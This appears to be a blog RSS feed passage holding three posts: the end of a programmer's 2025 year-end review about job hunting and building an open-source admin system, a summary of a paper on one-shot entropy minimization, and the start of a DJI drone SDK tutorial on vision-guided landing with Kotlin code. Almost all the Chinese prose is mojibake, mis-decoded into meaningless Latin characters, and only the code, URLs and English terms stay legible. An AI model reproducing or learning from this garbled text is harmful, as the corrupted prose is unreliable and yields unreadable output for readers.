<p>æ¥å°éä¹é¶åäºï¼ç»§ç»­æ´æ°ç®åï¼ç»§ç»­æï¼åç°å²ä½ç¡®å®å¤äºä¸äºï¼é¢è¯ä¹ç¡®å®å¤äºä¸äºï¼ä½è¿æ¯æ²¡æç»æï¼æå¼å§æèåªéçåå ï¼å¯è½æ¯å¤§ä¸æ¯ä¸ï¼å­¦åä½ï¼å¤å Gap5ä¸ªå¤æäºï¼ä¹æå¯è½æ¯æè¦æ±é«äºç¹ï¼å ä¸ºä¸ä¸å®¶5å¹´åå¥èæ¶14kï¼ç¦»èä¹æ¯14kï¼ç®ä¸å¥éð°ä¸å¹´å¤§æ¦æ20wï¼æ°å·¥ä½æ³æ¾ä¸ª20kä»¥ä¸çï¼å ä¸ºå³å°ä¸´è¿30ï¼åé¢æ´é¾ï¼ç¨åºå30å²ï¼35å²é½æ¯ä¸ä¸ªåï¼éçä¸ç´æ¾ä¸å°ð¼ï¼å¼å§æç¹å¦å®èªå·±ï¼æåè§ä¸è½è¿æ ·ä¸å»äºï¼äºæ¯å°±ç»§ç»­æ­å»ºåç«¯Nodeç³»ç»ï¼å¥½ä¸è®©èªå·±é²ä¸æ¥ã</p>
<p>åä¸åèå®¶ï¼è£ä½æ²¡äºäººä¸æ ·ï¼å¨å®¶éªäºç¶æ¯ä¸å«å¤©ï¼å®¶éäººé½ä¸ç¥éæå¤±ä¸äºï¼ç¶æ¯é½æ¯60å¤çå¹´çºªï¼èç¸æ¯åå»ºç­å·¥çï¼60å¤è¿ç¬é«ä¸ä½ï¼èå¦èº«ä½ä¸å¥½ï¼å¨å®¶ä¸²é£ä¸ªå åð°ä¸ä¸²çæä¸²ï¼ä¸è®©å¥¹å¹²è¿ä¸æ¿æï¼è¯´æ¯ç»ææèå©æ¬ï¼æä¸çªäºæ¬¡æ¿ä¸ç»å©ä¸æ¾å¯¹è±¡æ¥å¨èå¥¹å¥½è®©å¥¹æ¾å¼ä¸åä½å¤´å ä¸ªå°æ¶çæå·¥å³ä½ï¼å¥¹æ»æ¯ç¾å¶åæ°ï¼è¿æ¯æçä¸ä»½âå·¥ä½âãæåæä¹å¿å¿åè¯ä»ä»¬ï¼æå¤±ä¸äºå¢ï¼é¾éè®©ä»ä»¬è·çæä¸èµ·çæ¥ï¼ä¸èµ·ç¦èåï¼æåä¸å°ï¼ææ³å¤§å¤æ°äººé½è·æä¸æ ·åä¸å°ï¼æ¬æ¥å°±æ¯å¨å¤å°å·¥ä½çâæ¸¸å­âï¼æ¥åä¸æ¥å¿§å·²æ¯æåºæ¬çäºï¼äºæ¯åæç»æææ¯ç¶è¿åä¸æµ·ï¼åâæ²¡äºäººâä¸æ ·ã</p>
<p>10æåºï¼æç»äºååºäºç¬¬ä¸çå¼æº<a href="https://wladmin.cn" target="_blank" rel="noopener nofollow">å¨æ ç®¡çç³»ç»</a>ï¼åå«åç«¯åç«¯ï¼ç»å½ï¼æéæ§å¶ï¼åå¸å¨äº<a href="https://gitee.com/lyqjob/project-root" target="_blank" rel="noopener nofollow">Giteeä»åº</a>ï¼è¿ä¸ªç³»ç»åèäºå¥½å ä¸ªå¼æºç®¡çç³»ç»ï¼åé´ä»ä»¬çé¡µé¢ï¼åèä»ä»¬çå®ç°æ¶æï¼æ¢ç¶ååºæ¥äºè¿ä¸ªç³»ç»ï¼å°±è¦æä¸ªåå­ã</p>
<p>æç»ä»èµ·åå«<a href="https://www.wladmin.cn" target="_blank" rel="noopener nofollow">WlAdmin</a>ï¼è¯åâæªæ¥âä¸æ¯ç¢°ç·âèæ¥â,æ¯æå¯¹å¶æ±ææå¾ï¼æå¾æçâæªæ¥âï¼è¿æ¯ä¸ä¸ªå¨æ ç®¡çç³»ç»ï¼éç¨React + Antd + NodeJs + MySQL + Redisæå»ºã</p>
<p>11æï¼è¿ä¸ªæåºè¯¥æ¯ææç´¯ççä¸ä¸ªæï¼éçç³»ç»åççä¸çº¿ï¼è¦çæ­£è¾¾å°å¼æºå¯ç¨çä¼ä¸çº§ç®¡çç³»ç»çåè½ï¼è¿æå¾é¿ä¸æ®µè·¯è¦èµ°ï¼å¨10æåºææ¥è§¦å°äº<strong>AIç¼ç¨</strong>ï¼è¯´å®è¯ççå¾å¼ºå¤§ï¼èµ¶ä¸äºå­èçâTrae CNæ«ç­è½¦âï¼å½æ¶è¿è½åè´¹ç¨Claude Codeï¼ææ³è¦æ´å¿«çå®åè¿ä¸ªç³»ç»ï¼äºæ¯å¼å§å¨AIçå¸®å©ä¸ï¼æ¢æ¢å®åç³»ç»ï¼æ²¡æ³å°åå¥½ç¨å å¤©ï¼çªç¶AIåå¾å¾âç¬¨âï¼ç½ä¸ä¸æ¥æç¥éï¼å½å¤ç¦æ­¢Claude Codeå¨å½åä½¿ç¨äºï¼äºæ¯åä¸è½½äºCursorï¼åè´¹14å¤©ï¼äºæ¯å¼å§æ¡æ¡æ¹é ï¼åå©AIåç½ä¸çä¸äºæ¶æç¥è¯ï¼ç®¡çç³»ç»éæ¸å®åï¼ä½ä¸ºä¸ä¸ªåç«¯ï¼å»å­¦ä¹ äºè§£åç«¯ï¼æåç°ä»æ´ä½æ¶æä¸ä¸ªç³»ç»ï¼ççæºä¸å®¹æçï¼æå¼å§æå¼ä»¥ä¸ºè±ªçå°±æ¯é»è¾æç»´ï¼ç¥éçæ­£ä»0-1æ­å»ºèµ·æ¥<a href="https://juejin.cn/post/7573912365910442026" target="_blank" rel="noopener nofollow">å¨æ ç®¡çç³»ç»ï¼Node.js + Express + MySQL + React + Antd</a>ï¼æåç°åç«¯çð®ðºã</p>
<p>éçæç®åï¼è¿ä¸ªé¡¹ç®ä¹ç®æ¨å¹¿åºå»äºï¼æ¯æä¸å®çäººè®¿é®çï¼ä¸ºäºä¸å½±åç¬¬äºå¤©çâé¢è¯å®âè®¿é®ï¼æä»¥çº¿ä¸ç½ç«ä¸è½åºå¤§çé®é¢ï¼æ¬å°å¼åå¥½å¥½çï¼é¨ç½²å°æå¡å¨ä¸å°±æ¯åç§åºé®é¢ï¼äºæ¯ç»å¸¸æ§çæå°ä¸ä¸¤ç¹ï¼æå¾å¿åäº¤çãå¨ç¾¤éæ¨å¹¿æ¶æäººé®æâ<strong>ä½ åè¿ä¸ªé¡¹ç®çå©åï¼æä»·å¼åï¼å½ä»AIçè¡ï¼è¿ç¨Expressè¿ç§èæççä¸è¥¿</strong>âï¼æç«æ æ³åé©³ã11æç®åæçé½è¾å¶ä»æå°äºå¾å¤ï¼å½ç¶ä¾ç¶æ¯æ²¡æç»æï¼å½æ¶ä¸åº¦æ³æ¾å¼ï¼æåæåç°ï¼æå¥å ä¸ªæçæ¶é´ç²¾åéä¸æ¥åä¸ä¸ªç³»ç»ï¼ä¸åä¸æ´å¤©é£ç§ï¼æå¥è¿ä¹å¤§çææ¬ï¼å°±è¿ä¹æ¾å¼æç¹å¯æã</p>
<p>12æï¼éçGap9ä¸ªæçâ°ç»§ç»­å¾åèµ°ï¼11æç®åä¹é½ç³æ²å¤§æµ·ï¼è½ç¶æçè¿äºâäºé¢âï¼ä½ä¾ç¶æ²¡æç»æï¼è¿ä¸ªæ¶åè¯´ä¸ç¦èæ¯åçï¼æ¯ä¸ªæä¸æµ·çç§éæ¯1800ï¼ç®ä¸ååä¸ä¸ªæçææ¬ð°å¤§æ¦3000ï¼ä¹ç¡®å®æç¹æä¸å¨äºã</p>
<p>ç»§ç»­å®åç³»ç»ï¼å ä¸äºDockeré¨ç½²ï¼Dockerç¨èµ·æ¥æåç°ççå¾é¦ï¼æ¬å°æå»ºï¼æå¡å¨é¨ç½²ï¼å½æ¶æ¯ç¨äºä¸¤ä¸ªdocker-compose.ymlï¼ä¸ä¸ªç¨æ¥å¯å¨MySQLåRedisï¼ä¸ä¸ªç¨æ¥å¯å¨åç«¯æå¡ï¼è¿å¯¼è´ç»å¸¸æ§ä¸éå¯å°±æ æ³è¿æ¥æ°æ®åºï¼ä¹åæå°åæ¨çç½ªé­ç¥¸é¦ç»å¯¹æå®ï¼åå å¤©æ¹ä¸ºäºåªæä¸ä¸ªdocker-compose.ymlï¼ãå½æ¶æéç½ç«éæå¾å¤æ¨Monorepoæ¶æçæç« ï¼ä»ç»éè¯»åç°è¿ä¸ªç¡®å®æ¯å¥½ä¸è¥¿ï¼äºæ¯12æåå°±å¨é¢éæäºæ´ä¸ªç³»ç»ï¼æ¹ä¸ºMonorepo + Turboæ¶æçå¨æ ç®¡çç³»ç»ï¼å¯å¨ãæå»ºç¡®å®æ¯ä¹åå¿«äºå¾å¤ï¼é¡¹ç®ä½ç§¯æç¡®å®æ²¡ä»ç»çï¼å ä¸ºè¿æ¶åªæä¸¤ä¸ªåºç¨ï¼åç«¯Reactï¼ä»¥ååç«¯Nodeï¼åé¢æåéç¨<strong>React Native + Expo + TypeScript</strong> æå»ºæ©å±äº<a href="https://expo.dev/accounts/liyq/projects/app-rn-ts/builds/baa8d23c-208e-4af9-8bff-6123d872cf63" target="_blank" rel="noopener nofollow">App</a>ä»¥åä½¿ç¨<strong>Next.js + Tailwind + TypeScript</strong>æå»ºäºæ¯æSSRä»¥åSEOä¼åç<a href="https://www.wladmin.cn" target="_blank" rel="noopener nofollow">WlAdminï½Doc</a>ï¼è¿ä¸æ­¥æ©å±äºç¥è¯é¢ï¼èä¸åªæ¯åçå¨ç®åä¸ççæ***ï¼ç°å¨å¯æ12æä»½ç®åå¨é½ç³æ²å¤§æµ·</p>
<h2 id="30å²">30å²</h2>
<p>ä¸å¨è¿æ¥äº30å²çæ¥ðï¼é½è¯´â<strong>ä¸åèç«</strong>âï¼å¯ææ²¡è½¦æ²¡æ¿æ²¡å¯¹è±¡ï¼æ°æ¶ä»£çâä¸æ âäººåðã20å¹´åå°ä¸æµ·æ¶ï¼Bossä¸é½æ¯æ¶æ¯ï¼è½ç¶å¤§å¤é½æ¯â<strong>å¤å</strong>âï¼ç°å¦ä»ï¼ç®åä¸æ¯å·²è¯»ä¸åï¼å°±æ¯æ²¡æä¸æï¼å¤§ç¯å¢æåä½è¿·ï¼è½ç¶è±è´¹å ä¸ªæååºæ¥äºè¿ä¸ª<a href="https://wladmin.cn/" target="_blank" rel="noopener nofollow">ä¼ä¸çº§å¨æ ç®¡çç³»ç»</a>ï¼ä½å¥½åæ­£å¦ä¹åç¾¤éè¯´çï¼âæ²¡ä»ä¹å¤ªå¤§çä»·å¼âï¼ä¹å°±ç®åè½æ·»ä¸ç¬ã<strong>AI</strong>å·²ç»è½å®æ80%çå·¥ä½ï¼ä½ä¸ºä¸ä¸ªåç«¯ï¼å®éä½¿ç¨è¿AIï¼æåç°AIççå·²ç»æåç«¯æè¿äºæ³¥åéãè¿ä¸å¹´ï¼è¯´å¥ä¸å¥½å¬çï¼ä¸äºæ æð¤£ï¼ä¹æºå¤±è´¥çãç³»ç»å·²ç»å®åçå·®ä¸å¤ï¼<strong>Webç«¯</strong>ã<strong>æå¡ç«¯</strong>ã<strong>Appç«¯</strong>ã<strong>Docç½ç«</strong>ï¼å·®ä¸å¤å¯ä»¥åä¸æ¥æèä¸ä¸æªæ¥çè·¯äºã</p>
<h2 id="æªæ¥">æªæ¥</h2>
<p>é©¬ä¸2026å°±è¦å°äºï¼å¸ææ°çä¸å¹´ï¼è½å¤è¿æ¥ä¸ä»½âæªæ¥âï¼ä¹ç¥æ¿çå°è¿éçæåæ°çä¸å¹´è½æ¶è·ä¸°ç¡çæå®</p>
<h2 id="-è´è°¢">ð è´è°¢</h2>
<p>æè°¢éè¯»å°è¿éçæåðï¼å¨è¿éåçè¸ç®å¸æå¤§å®¶è½å¤å»è®¿é®ä¸ä¸æç<a href="https://wladmin.cn" target="_blank" rel="noopener nofollow">å¼æºç®¡çç³»ç»</a>ï¼å¯ä»¥å»<a href="https://gitee.com/lyqjob/project-root" target="_blank" rel="noopener nofollow">ä»åº</a>åéä¸æ¥èèï¼æ¬¢è¿ðåä½å¤§ä½¬æåº<a href="https://gitee.com/lyqjob/project-root/issues" target="_blank" rel="noopener nofollow">æè§</a>ï¼æé®é¢ä¹å¯ä»¥åæé®ç®±ð®<a href="mailto:lyqjob@yeah.net" target="_blank" rel="noopener nofollow">lyqjob@yeah.net</a>ï¼åæ¬¡æè°¢</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-12-31 16:48">2025-12-31 16:47</span>&nbsp;
<a href="https://www.cnblogs.com/liyq666">é¦çèé¥¼</a>&nbsp;
éè¯»(<span id="post_view_count">498</span>)&nbsp;
è¯è®º(<span id="post_comment_count">31</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19427476);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19427476', targetLink: 'https://www.cnblogs.com/liyq666/p/19427476', title: '2025 å¹´ç»æ»ç»ï½30å²' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ è®ºæè§£è¯»ï¼One-shot Entropy Minimization ]]></title>
    <link>https://www.cnblogs.com/qizhou/p/19426973</link>
    <guid>5fc431f50c491a1c158747bc641328bf</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/qizhou/p/19426973" title="åå¸äº 2025-12-31 15:36">
    <span role="heading" aria-level="2">è®ºæè§£è¯»ï¼One-shot Entropy Minimization</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p data-pm-slice="0 0 []">ä¸ç¯è¿æªåè¡¨çè®ºæï¼ä½åäºå¤§éå®éªå¯¹çµæå°åæå·§æåæ¨¡åæ¨çè½åè¿è¡äºæ¢ç´¢ãæ¬æè®­ç»äº13440ä¸ªå¤§åè¯­è¨æ¨¡åï¼åç°çµæå°åï¼EMï¼åªéè¦ä¸ä¸ªæªæ è®°çæ°æ®å10æ­¥ä¼åï¼æ§è½æåå°±æ¯<strong>RL</strong>è¿å¼ºãåºäºä¸¤ä¸ªç´æ¥èç®åçåè®¾ï¼</p>
<ul>
<li>
<p>çæå¤§åè¯­è¨æ¨¡åçéæ ·è¿ç¨æ¬è´¨ä¸æ¯éæºçã</p>
</li>
<li>
<p>æ­£ç¡®ç­æ¡ççµéå¸¸ä½äºéè¯¯ç­æ¡ã</p>
</li>
</ul>
<p>EMåRLæ<strong>å±åç®æ </strong>ï¼å¨ä¸æ·»å æ°ç¥è¯çæåµä¸éæ¾é¢è®­ç»æ¨¡åçæ½å¨æ½åï¼é½ä¾èµäºæè°âtokenéè¯çº§âã</p>
<p>åæç½åï¼<a href="https://arxiv.org/abs/2505.20282v4" target="_blank" rel="noopener nofollow">https://arxiv.org/abs/2505.20282v4</a></p>
<h1>æ¹æ³</h1>
<p>ç»å®prompt <span class="math">$x$</span>ï¼çæåºå<span class="math">$y$</span>ï¼æå°åçæåºåtokençº§å«çé¢æµçµï¼</p>
<p style="text-align: center"><span class="math">$\displaystyle L_{\mathrm{EM}} = \frac{1}{|y|} \sum_{t = 1}^{|y|} H_t&nbsp;&nbsp;$</span></p>
<p style="text-align: center"><span class="math">$\displaystyle H_t = -\sum_{v \in V} p_\theta(v \mid y_{&lt;t}, x)\,\log p_\theta(v \mid y_{&lt;t}, x)$</span></p>
<p>è®­ç»å¯¹åä¸ªæ ·æ¬è¿è¡ï¼ä»æªæ æ³¨æ°æ®ä¸­ç­éï¼2.2èï¼ï¼æ¨¡åå¨å¤æ¬¡éæ ·ä¸è¡¨ç°åºè¾é«ç pass@k æ¹å·®ï¼ä»èå¯¹âçµâæ´ææï¼æä¾æ´å¼ºç<strong>çµæ¢¯åº¦</strong>ä¿¡å·ãæè°pass@k æ¹å·®å°±æ¯å¤§æ¨¡åéå¯¹åä¸ä¸ªæ°æ®çæ<span class="math">$k$</span>æ®µåå®¹ï¼è®¡ç®<span class="math">$k$</span>ä¸ªåå®¹æ­£ç¡®ä¸å¦çæ¹å·®ã</p>
<h1>å®éª</h1>
<p><strong>è®­ç»è®¾ç½®ï¼</strong>éå¯¹ç¹å®æ ·æ¬ï¼æ¯æ¬¡çæ64æ®µæ¨çåå®¹ï¼å³è®­ç»æ¹éä¸º64ï¼ï¼ç¨ä»¥ä¸æå°çµæå¤±å¾®è°å¤§æ¨¡å10æ¬¡ãé¢æµæ¸©åº¦è®¾ç½®ä¸º0.5ï¼å­¦ä¹ çåºå®ä¸º<span class="math">$2\times 10^{-5}$</span>ã</p>
<p>è¡¨1ï¼åç§æ¨çæ¨¡åä¸EMçå¯¹æ¯ã</p>
<p>å¾1ï¼ç¨äºEMä¹åï¼æ¨¡åçætoken çæ¦çåå¸ãEMä½¿åå¸æ´å³åã</p>
<p>å¾2ï¼EMæå¤±åè¯ä¼°åæ°éçè®­ç»çååæ²çº¿ã</p>
<p>å¾3/4ï¼ä¸åæ¸©åº¦å¯¹æ§è½çå½±åã</p>
<p>å¾5ï¼EMåRLååæ§è¡ï¼æ§è½éè¿­ä»£çååãåç°RLä¹ååºç¨EMä¼å¯¼è´æ§è½ä¸éï¼èEMä¹åRLæ§è½ä¼æåãè¿è¡¨æEMå å§äºRLå¼å¥çåéæ­æ²ï¼å¼ºåäºRLçâå¯¹é½ç¨âã</p>
<p>è¡¨2ï¼å¤æ ·æ¬çEMä¸åæ ·æ¬çEMå¯¹æ¯ï¼çåºå¤æ ·æ¬ä¹æ²¡æå¤å¤§ä¼å¿ã</p>
<p>å¾6ï¼ä¸åå­¦ä¹ çå¯¹æ¨çæ§è½çå½±åã</p>
<h1>è®¨è®ºä¸è§è§£</h1>
<p>åæ¬¡EMå¢ççä¸éç±åºç¡æ¨¡åçåå¨æ¨çè½åå³å®ãå¨ç¸å¯¹è¾å¼±çLLaMA-3.1-8Bä¸ï¼åæ¬¡EMçå¹³ååç¡®çä»æé«å°24.3%ï¼åå¼ºè¶è¿23.6%çåºçº¿ãè¿è¡¨æï¼å½åºå±æ¨¡åç¼ºä¹è¶³å¤çæ¨çè½åæ¶ï¼æå°EMä¼åæ æ³å®å¨å¼¥è¡¥å¶ä¸è¶³ã</p>
<p>RLæ ¹æ®å¤é¨çå®å¥å±è°æ´ä»¤çæ¦çãè¿éå¸¸ä¼ä¿è¿ä»¥åä½æ¦çï¼å°¾é¨ï¼ä»£å¸çç¸å¯¹æåãå³ä½¿å¨éæ°æåºåï¼è¿äºä»£å¸ä¹å¾å¾å æ®æ¦çåå¸çä¸­é´ä½ç½®ï¼éè¦å¨éæ ·è¿ç¨ä¸­éæ©æ´é«çæ¸©åº¦ãå æ­¤ï¼RLè®­ç»çæ¨¡åè¡¨ç°åºç¸åçè¶å¿ï¼æ§è½éçéæ ·æ¸©åº¦çåé«èæé«ï¼å¦å¾4æç¤ºã</p>
<p>å¨å¤§å¤æ°åºæ¯ä¸­ï¼å°¤å¶æ¯å¨SFTåè®­ç»æå°çRLç¯å¢ä¸­ï¼EMæ¾èå°ä¿®åªäºåä½çå³ç­è·¯å¾ï¼ç¨³å®äºå³é®é¢æµï¼éªè¯äºå¶ä½ä¸ºæå°ä½å¼ºå¤§çä¼åç­ç¥çæææ§åéç¨æ§ã</p>
<p>&nbsp;</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.1736111111111111" data-date-updated="2025-12-31 19:46">2025-12-31 15:36</span>&nbsp;
<a href="https://www.cnblogs.com/qizhou">é¢å¨</a>&nbsp;
éè¯»(<span id="post_view_count">74</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19426973);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19426973', targetLink: 'https://www.cnblogs.com/qizhou/p/19426973', title: 'è®ºæè§£è¯»ï¼One-shot Entropy Minimization' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åºäºå¤§çMSDKå®ç°çæ äººæºè§è§å¼å¯¼èªéåºéè½åè½ ]]></title>
    <link>https://www.cnblogs.com/foury/p/19426887</link>
    <guid>ae87f6b0401961017f61c8dc58eae3a7</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/foury/p/19426887" title="åå¸äº 2025-12-31 15:24">
    <span role="heading" aria-level="2">åºäºå¤§çMSDKå®ç°çæ äººæºè§è§å¼å¯¼èªéåºéè½åè½</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åºäºå¤§çmsdkå®ç°çæ äººæºè§è§å¼å¯¼èªéåºéè½åè½">åºäºå¤§çMSDKå®ç°çæ äººæºè§è§å¼å¯¼èªéåºéè½åè½</h1>
<h2 id="æ¦è¿°">æ¦è¿°</h2>
<p>æåéæ±ï¼æ³è¦æ äººæºå¨æ§è¡å®èªçº¿ä»»å¡åï¼ä¸é®è½å°ä¸ä¸ªæå®çä½ç½®ï¼ç®åäººå·¥æ§å¶ã</p>
<p>å®ç°ä¸å¥å®æ´çæ äººæºèªä¸»éè½åè½,éè¿èææææ§å¶ä½¿æ äººæºé£åæå®ä½ç½®ï¼åå©ç¨è§è§è¯å«å¼å¯¼æ äººæºç²¾ç¡®éè½å°å·ä½ä½ç½®ãæ¬æä¸­éç¨èªéåºéè½ç­ç¥,æ ¹æ®é«åº¦å¨æè°æ´ç²¾åº¦è¦æ±åä¸ééåº¦,ä»¥å®ç°å®å¨ãç²¾ç¡®çéè½ã</p>
<p><strong>æ ¸å¿ç¹:</strong></p>
<ul>
<li>èæææå¯¼èªæ¿ä»£FlyToåè½</li>
<li>åè½´(X/Y)ä½ç½®åç§»å®æ¶è°æ´</li>
<li>é«åº¦èªéåºéè½ç­ç¥</li>
<li>è§è§è¯å«å¼å¯¼å®ä½</li>
<li>æºè½é¿éç®¡ç</li>
</ul>
<hr>
<h2 id="ç³»ç»æ¶æ">ç³»ç»æ¶æ</h2>
<h3 id="æ´ä½æµç¨">æ´ä½æµç¨</h3>
<div class="mermaid">graph TD
    A[ç¨æ·è§¦åReturn to Vehicle] --&gt; B[è·åæ äººæºGPSä½ç½®]
    B --&gt; C[è®¡ç®ä¸ç®æ ç¹è·ç¦»]
    C --&gt; D[å¯å¨èæææå¯¼èª]
    D --&gt; E[é£åç®æ ä½ç½® 5m/s]
    E --&gt; F{è·ç¦»å°äº10m?}
    F --&gt;|å¦| E
    F --&gt;|æ¯| G[å¼å§èªéåºéè½]
    G --&gt; H[è§è§è¯å«ç³»ç»]
    H --&gt; I[è®¡ç®X/Yåç§»é]
    I --&gt; J[æ´æ°åç§»éå°ViewModel]
    J --&gt; K[èªéåºéè½å¾ªç¯]
    K --&gt; L{é«åº¦åæ®µå¤æ­}
    L --&gt;|é«äº50m| M[é«ç©ºæ¨¡å¼]
    L --&gt;|20-50m| N[ä¸­ç©ºæ¨¡å¼]
    L --&gt;|5-20m| O[ä½ç©ºæ¨¡å¼]
    L --&gt;|ä½äº5m| P[æä½ç©ºæ¨¡å¼]
    M --&gt; Q[è®¡ç®è°æ´éåº¦åä¸ééåº¦]
    N --&gt; Q
    O --&gt; Q
    P --&gt; Q
    Q --&gt; R{åç§»å¤§äºéå¼2å?}
    R --&gt;|æ¯| S[åæ­¢ä¸éåªè°æ´]
    R --&gt;|å¦| T[è¾¹è°æ´è¾¹ä¸é]
    S --&gt; U{é«åº¦å°äº5m?}
    T --&gt; U
    U --&gt;|æ¯| V[å³é­ä¸è§é¿é]
    U --&gt;|å¦| K
    V --&gt; W{é«åº¦å°äºç­äº0.1m?}
    W --&gt;|å¦| K
    W --&gt;|æ¯| X[çéå®ææ¸çèµæº]

</div><h2 id="ææ¯å®ç°æè·¯">ææ¯å®ç°æè·¯</h2>
<h3 id="ç¬¬ä¸æ­¥è®©æ äººæºé£å°ç®æ ä½ç½®">ç¬¬ä¸æ­¥:è®©æ äººæºé£å°ç®æ ä½ç½®?</h3>
<h4 id="é®é¢åæ">é®é¢åæ</h4>
<p>é¥æ§å¨æ§å¶çæ äººæºå¨æ§è¡å®èªçº¿ä»»å¡ä¹åï¼é£å°ç»å®éè½ç¹ï¼æ±½è½¦æå¶ä»è½½å·ä¸ï¼ãæåçæ³æ³æ¯ä½¿ç¨DJI SDKæä¾ç<code>FlyTo</code>åè½,ç´æ¥æå®ç®æ GPSåæ è®©æ äººæºé£è¿å»ãä½å¨å®éæµè¯ä¸­ï¼åç°é¨åæºåï¼å¦M3Eï¼å¹¶ä¸æ¯æ<code>FlyTo</code>åè½ã</p>
<p><strong>æºåæ¯å¦æ¯æ<code>FlyTo</code>åè½åèææ¡£</strong>ï¼<a href="https://developer.dji.com/doc/mobile-sdk-tutorial/cn/tutorials/intelligent-flight.html" target="_blank" rel="noopener nofollow">https://developer.dji.com/doc/mobile-sdk-tutorial/cn/tutorials/intelligent-flight.html</a></p>
<h4 id="è§£å³æ¹æ¡èæææå¯¼èª">è§£å³æ¹æ¡:èæææå¯¼èª</h4>
<p>æ¢ç¶<code>FlyTo</code>åè½ä¸å¯ç¨,é£å°±ç¨<strong>èæææ</strong>åè½è¿è¡æ¨¡æã</p>
<p><strong>æè·¯:</strong></p>
<ol>
<li>è®¡ç®å½åä½ç½®å°ç®æ ä½ç½®ç<strong>æ¹ä½è§</strong>(bearing)</li>
<li>å°æ¹ä½è§è½¬æ¢ä¸º<strong>éåº¦åé</strong>(åå/ä¸è¥¿)</li>
<li>æç»­åéèææææä»¤,è®©æ äººæºæç®æ é£è¡</li>
<li>å®æ¶çæµè·ç¦»,æ¥è¿ç®æ æ¶åæ­¢</li>
</ol>
<p><strong>æ¹ä½è§è®¡ç®:</strong></p>
<pre><code class="language-kotlin">private fun calculateBearing(latA: Double, lonA: Double, latB: Double, lonB: Double): Double {
    val lat1 = Math.toRadians(latA)
    val lat2 = Math.toRadians(latB)
    val dLon = Math.toRadians(lonB - lonA)
    
    val y = Math.sin(dLon) * Math.cos(lat2)
    val x = Math.cos(lat1) * Math.sin(lat2) - Math.sin(lat1) * Math.cos(lat2) * Math.cos(dLon)
    
    var bearing = Math.toDegrees(Math.atan2(y, x))
    bearing = (bearing + 360) % 360  // å½ä¸åå°0-360åº¦
    
    return bearing  // 0Â°=æ­£å, 90Â°=æ­£ä¸, 180Â°=æ­£å, 270Â°=æ­£è¥¿
}
</code></pre>
<p><strong>éåº¦åéè®¡ç®:</strong></p>
<pre><code class="language-kotlin">val bearing = calculateBearing(currentLat, currentLon, targetLat, targetLon)
val bearingRad = Math.toRadians(bearing)

// ä½¿ç¨GROUNDåæ ç³»(å°é¢åæ ç³»)
val navParam = VirtualStickFlightControlParam().apply {
    rollPitchCoordinateSystem = FlightCoordinateSystem.GROUND
    verticalControlMode = VerticalControlMode.POSITION
    yawControlMode = YawControlMode.ANGLE
    rollPitchControlMode = RollPitchControlMode.VELOCITY
    
    // å°éåº¦åè§£ä¸ºåååä¸è¥¿åé
    pitch = NAVIGATION_SPEED * Math.cos(bearingRad)  // åååé(5m/s)
    roll = NAVIGATION_SPEED * Math.sin(bearingRad)   // ä¸è¥¿åé(5m/s)
    yaw = bearing  // è®©æºå¤´æåç®æ 
    verticalThrottle = targetAlt
}
</code></pre>
<ul>
<li>GROUNDåæ ç³»æ¯<strong>ç»å¯¹æ¹å</strong>,ä¸åæ äººæºæåå½±å</li>
<li>pitchæ§å¶åå,rollæ§å¶ä¸è¥¿ã</li>
</ul>
<p><strong>èæææåæ°å«ä¹</strong>ï¼<a href="https://developer.dji.com/doc/mobile-sdk-tutorial/cn/basic-introduction/basic-concepts/flight-controller.html#%E8%99%9A%E6%8B%9F%E6%91%87%E6%9D%86" target="_blank" rel="noopener nofollow">https://developer.dji.com/doc/mobile-sdk-tutorial/cn/basic-introduction/basic-concepts/flight-controller.html#èæææ</a></p>
<hr>
<h3 id="ç¬¬äºæ­¥å¤æ­ä½æ¶å°è¾¾ç®æ ç¹ä¸æ¹éè¿">ç¬¬äºæ­¥:å¤æ­ä½æ¶å°è¾¾ç®æ ç¹ä¸æ¹éè¿</h3>
<h4 id="æç»­çæµè·ç¦»">æç»­çæµè·ç¦»</h4>
<p>æ¯100msæ£æ¥ä¸æ¬¡å½åä½ç½®ä¸ç®æ çè·ç¦»ï¼è·ç¦»å°äºé¢æå¼<code>ARRIVAL_THRESHOLD</code>,å°±è®¤ä¸ºæ äººæºå·²å°è¾¾ç®æ ç¹ä¸æ¹éè¿ï¼åæ­¢å¯¼èªï¼å¼å§éè½:</p>
<pre><code class="language-kotlin">val navTask = object : Runnable {
    override fun run() {
        val currentLoc = getAircraftLocation()
        val remainingDistance = calculateDistance(
            currentLoc.latitude, currentLoc.longitude,
            targetLat, targetLon
        )
        
        if (remainingDistance &lt; ARRIVAL_THRESHOLD) {  // 10ç±³å
            // å°è¾¾ç®æ ,åæ­¢å¯¼èª,å¼å§éè½
            isNavigating = false
            startDynamicAdjustment()
        } else {
            // ç»§ç»­é£è¡
            sendNavigationCommand()
            virtualStickHandler?.postDelayed(this, 100)
        }
    }
}
</code></pre>
<hr>
<h3 id="ç¬¬ä¸æ­¥ç²¾ç¡®éè½å°æå®ç¹">ç¬¬ä¸æ­¥:ç²¾ç¡®éè½å°æå®ç¹</h3>
<p>æ äººæºè½ç¶å°äºç®æ éè¿(10ç±³å),ä½æä»¥ä¸é®é¢ï¼</p>
<ol>
